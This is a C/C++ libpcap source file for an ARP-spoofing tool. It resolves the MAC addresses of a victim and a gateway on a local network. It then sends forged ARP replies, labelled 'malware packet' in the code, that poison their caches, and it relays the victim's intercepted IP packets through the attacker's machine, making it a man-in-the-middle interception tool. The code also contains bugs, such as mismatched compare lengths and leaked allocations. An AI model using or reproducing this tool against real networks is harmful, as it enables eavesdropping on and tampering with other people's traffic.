#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "custom.h"
#include <vector>


using namespace std;

void usage() {
  printf("syntax: sende_arp <interface> <sender_ip> <target_ip>\n");
  printf("sample: sende_arp wlan0 192.168.10.2 192.168.10.1\n");
}

u_int16_t my_ntohs(uint16_t n){
   return n>>8 | n<<8;
}


void print_ethernet(const unsigned char *data){
    ethernet_header* ether = new ethernet_header;


ether=(struct ethernet_header *)data;
u_int16_t ether_type;
ether_type=my_ntohs(ether->ether_type);
if(ether_type == 0x0800)
{

   printf ("\nDest Mac=");
    for(int i=0;i<=5;i++)
    {
        printf("%02X", ether->ether_dmac[i]);
        if(i!=5)
        {
            printf(":");
        }

    }
    printf ("\nSrc Mac=");
     for(int i=0;i<=5;i++)
     {
         printf("%02X", ether->ether_smac[i]);
         if(i!=5)
         {
             printf(":");
         }

     }
}
}
void print_ip(const unsigned char *data)
{

    ip_header *iph = new ip_header;
    iph = (struct ip_header *)data;

    if(iph->protocol == 0x60){


    printf("\nDest IP=");
    for(int i=0;i<=3;i++)
    {
        printf("%u", iph->ip_destaddr[i]);
        if(i!=3)
        {
            printf(".");
        }

    }
    printf ("\nSrc IP=");
     for(int i=0;i<=3;i++)
     {
         printf("%u", iph->ip_srcaddr[i]);
         if(i!=3)
         {
             printf(".");
         }

     }

}

}

void print_tcp(const unsigned char *data){

    tcp_header *th = new tcp_header;
    th = (struct tcp_header *)data;



    printf("\nDest Port=%d",my_ntohs(th->dport));
    printf("\nSrc Port=%d",my_ntohs(th->sport));
    printf("\n");

 }
void print_data(const unsigned char *data){
    struct payload *pay;
    pay = (struct payload *)data;
    printf("\n");

    printf ("\n%s\n ",pay->http_data);

    printf("\n========END========\n");
}
void ip_to_strok(char *ip, u_int8_t *array){

    int k=1;
    char *setemp;
    char *se[4];
    setemp = strtok(ip, ".");
    se[0]=setemp;


    while (setemp != NULL) {
    setemp = strtok(NULL, ".");
    se[k]=setemp;

    k++;
    }
    for (int i=0; i<=3; i++){

      array[i]=atoi((char *)se[i]);

    }
}


void print_malware_packet(const unsigned char *data){
    printf("\n============Sending Malware packet============\n");
    printf("\nSender IP:");
    for(int i=0; i<=3; i++){

    printf("%u",data[i+28]);
    if(i!=3)
          {
              printf(".");
          }
    }

    printf("\nSender Mac:");
    for(int i=0; i<=5; i++){

    printf("%02X",data[i+22]);
    if(i!=5)
            {
                printf(":");
            }
    }

    printf("\nTarget IP:");
    for(int i=0; i<=3; i++){

    printf("%u",data[i+38]);
    if(i!=3)
          {
              printf(".");
          }
    }

    printf("\nTarget Mac:");
    for(int i=0; i<=5; i++){

    printf("%02X",data[i+32]);
    if(i!=5)
            {
                printf(":");
            }
    }

    printf("\n");


}

void print_arp(const unsigned char *cmp){

    arp_header* arp = new arp_header;
    arp= (struct arp_header *)cmp;

    printf("\nSender IP:");
    for(int i=0; i<=3; i++){

    printf("%u",arp->sender_IP[i]);
    if(i!=3)
          {
              printf(".");
          }
    }

    printf("\nSender Mac:");
    for(int i=0; i<=5; i++){

    printf("%02X",arp->sender_MAC[i]);
    if(i!=5)
            {
                printf(":");
            }
    }

    printf("\nTarget IP:");
    for(int i=0; i<=3; i++){

    printf("%u",arp->target_IP[i]);
    if(i!=3)
          {
              printf(".");
          }
    }

    printf("\nTarget Mac:");
    for(int i=0; i<=5; i++){

    printf("%02X",arp->target_MAC[i]);
    if(i!=5)
            {
                printf(":");
            }
    }
    printf("\n");

}

void get_my_mac(char *dev,u_int8_t *my_mac){

    int sock = socket(PF_INET, SOCK_DGRAM, 0);

    struct ifreq req;
    int j = 0;
    if (sock < 0) {
             perror("socket");
             exit(EXIT_FAILURE);
     }

     memset(&req, 0, sizeof(req));
     strncpy(req.ifr_name, dev, IF_NAMESIZE - 1);

     if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
             perror("ioctl");
             exit(EXIT_FAILURE);
     }

     for(j=0;j<=5;j++) {
             my_mac[j]=(unsigned char) req.ifr_hwaddr.sa_data[j];
     }
}

void get_my_ip(char *dev,u_int8_t *my_ip, char *errbuf){



    pcap_if_t *alldevs;
    pcap_if_t *d;
    struct pcap_addr *a;
    int i = 0;
    int no;
    char * myip;

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
        printf("pcap_findalldevs error\n");

    }
    for(pcap_if_t *d=alldevs; d!=nullptr; d=d->next) {
        if(!strcmp(dev,d->name))
        {
            for(pcap_addr_t *a=d->addresses; a!=nullptr; a=a->next) {
                        if(a->addr->sa_family == AF_INET)
                            myip=inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr);

            }
    }
    }
    pcap_freealldevs(alldevs);

    ip_to_strok(myip,my_ip);


}


void Set_nomal_packet(Vector_Session *VS,u_int8_t *my_ip, u_int8_t *my_mac,u_char *packet,pcap_t *handle){
    get_target_mac(VS,handle,packet,my_ip,my_mac);

    memset(packet,0,42);
    uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t unknown_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

    for(int k=0;k<=5;k++){
    packet[k]=broadcast[k];
    packet[k+6]=my_mac[k];
    }

    //ether type//
    packet[12]=0x08;
    packet[13]=0x06;

    //hardware type//
    packet[14]=0x00;
    packet[15]=0x01;

    //Protocol type//
    packet[16]=0x08;
    packet[17]=0x00;

    //Hardware Size//
    packet[18]=0x06;
    //IP Size//
    packet[19]=0x04;

    //opcode//
    packet[20]=0x00;
    packet[21]=0x01;
    for(int k=0;k<=5;k++){
       packet[k+22]=my_mac[k];
       packet[k+32]=unknown_mac[k];
    }
    for(int k=0;k<=3;k++){
       packet[k+28]=my_ip[k];
       packet[k+38]=VS->arp_sender_IP[k];
    }
    printf("============Sending Nomal Packet============\n");
    pcap_sendpacket(handle,packet,42);

}


void Reply_packet(Vector_Session *VS,pcap_t *handle,u_char *packet, u_int8_t *my_mac,u_int8_t *sender_mac,u_int8_t *target_mac, u_int8_t *my_ip){

    struct pcap_pkthdr* header;
    const u_char* data;

    while(true){
    int res = pcap_next_ex(handle, &header, &data);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    ethernet_header* eth = new ethernet_header;
    arp_header* arp = new arp_header;

    eth=(struct ethernet_header*)data;
    data=data+sizeof(ethernet_header);
    arp= (struct arp_header *)data;
    u_int16_t ether_type;
    ether_type=my_ntohs(eth->ether_type);
    if(memcmp(VS->arp_sender_IP,arp->sender_IP,6)&&memcmp(arp->target_IP,my_ip,6) && ether_type == 0x0806){
        const u_char *cmp;
        pcap_next_ex(handle, &header, &cmp);
        ethernet_header* eth1 = new ethernet_header;
        arp_header* arp1 = new arp_header;

        eth1=(struct ethernet_header*)cmp;
        cmp=cmp+14;
        arp1= (struct arp_header *)cmp;
        memset(VS->eth_sender_mac,0,6);
        memcpy(VS->eth_sender_mac,eth1->ether_smac,6);
        for(int i=0;i<=5;i++){
            sender_mac[i]=eth1->ether_smac[i];
            printf("%02X",sender_mac[i]);
        }
        for(int i=0;i<=5;i++){
            target_mac[i]=eth1->ether_dmac[i];
        }
        printf("\n============Recive Data============\n");
        print_arp(cmp);
        printf("\n");
        // Custom Packet Start //

        set_malware_packet(VS,handle,packet,my_mac);


       }
    break;
}

}
void set_malware_packet(Vector_Session *VS, pcap_t *handle, u_char * packet, u_int8_t *my_mac){
    for(int k=0;k<=5;k++){
    packet[k]=VS->eth_sender_mac[k];
    packet[k+6]=my_mac[k];
    }
    //ether type//
    packet[12]=0x08;
    packet[13]=0x06;

    //hardware type//
    packet[14]=0x00;
    packet[15]=0x01;

    //Protocol type//
    packet[16]=0x08;
    packet[17]=0x00;

    //Hardware Size//
    packet[18]=0x06;
    //IP Size//
    packet[19]=0x04;

    //opcode - reply//
    packet[20]=0x00;
    packet[21]=0x02;

    for(int k=0;k<=5;k++){
       packet[k+22]=my_mac[k];
       packet[k+32]=VS->eth_sender_mac[k];
    }
    for(int k=0;k<=3;k++){
       packet[k+28]=VS->arp_target_IP[k];
       packet[k+38]=VS->arp_sender_IP[k];
    }
    pcap_sendpacket(handle,packet,42);
    print_malware_packet(packet);
}
void get_target_mac(Vector_Session *VS,pcap_t *handle,u_char *packet, u_int8_t *my_ip,u_int8_t *my_mac){

    for(int k=0;k<=5;k++){
    packet[k]=VS->eth_sender_mac[k];
    packet[k+6]=my_mac[k];
    }

    //ether type//
    packet[12]=0x08;
    packet[13]=0x06;

    //hardware type//
    packet[14]=0x00;
    packet[15]=0x01;

    //Protocol type//
    packet[16]=0x08;
    packet[17]=0x00;

    //Hardware Size//
    packet[18]=0x06;
    //IP Size//
    packet[19]=0x04;

    //opcode//
    packet[20]=0x00;
    packet[21]=0x01;
    for(int k=0;k<=5;k++){
       packet[k+22]=my_mac[k];
       packet[k+32]=VS->eth_target_mac[k];
    }
    for(int k=0;k<=3;k++){
       packet[k+28]=my_ip[k];
       packet[k+38]=VS->arp_target_IP[k];
    }

    pcap_sendpacket(handle,packet,42);

    struct pcap_pkthdr* header;
    const u_char* data;
    pcap_next_ex(handle, &header, &data);
    ethernet_header* eth = new ethernet_header;
    eth=(struct ethernet_header*)data;

    for(int i=0; i<=5; i++){
    printf("%02X",eth->ether_smac[i]);
    if(i==5){
        printf("\n");
    }
}
    memcpy(VS->eth_target_mac,eth->ether_smac,6);
    memset(eth->ether_dmac,0,6);
    memset(eth->ether_smac,0,6);
    memset(&eth->ether_type,0,2);
    memset(packet,0,42);



}


void Send_Relay_packet(Vector_Session *VS,pcap_t *handle, u_char *packet,u_int8_t *my_mac){

    struct pcap_pkthdr* header;
    const u_char* data;

    while (true) {


      int res = pcap_next_ex(handle, &header, &data);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;
        ethernet_header* eth = new ethernet_header;
        ip_header *iph = new ip_header;
        tcp_header *th = new tcp_header;
        const u_char * offset;

        eth= (struct ethernet_header *)data;
        u_int16_t ether_type;
        ether_type=my_ntohs(eth->ether_type);
        offset=data+sizeof (struct ethernet_header);
        iph= (struct ip_header *)offset;

        int ip_length=0;
        ip_length=(iph->val)&0x0F;
        int ipl=ip_length*4;
        offset=offset+ipl;
        //print_tcp(data);

        th = (struct tcp_header *)offset;
        int size_offset=(th->flags)&0xF000;
        size_offset=(ip_length+size_offset)*4-iph->total_length;

        if (!memcmp(iph->ip_srcaddr,VS->arp_sender_IP,4)&& !memcmp(eth->ether_dmac,my_mac,6) && ether_type == 0x0800){

            printf("\n======================================\n");
            printf("=============Packet Send!=============\n");
            printf("======================================\n");
            uint8_t* ret = new uint8_t[header->len];
            memcpy(ret,data,header->len);

            u_int8_t merge[12];
            memcpy(merge,VS->eth_target_mac,6);
            memcpy(&merge[6],my_mac,6);
            memcpy(ret,merge,12);
            pcap_sendpacket(handle,ret,header->len);
            if(!memcmp(VS->eth_target_mac,eth->ether_dmac,6)){
             set_malware_packet(VS,handle,packet,my_mac);
            }
}

//            u_char original[1000];
//            *original=*data;
//            const u_char *data_payload=data;




//            printf("\n============Recive Data============\n");
//            if(ether_type == 0x0806){
//                print_malware_packet(packet);
//                pcap_sendpacket(handle,packet,42);
//                print_arp(data);
//            }
//            print_ethernet(ether_data);
//            print_ip(data);
//            data_payload=data_payload+offset;



        }


}


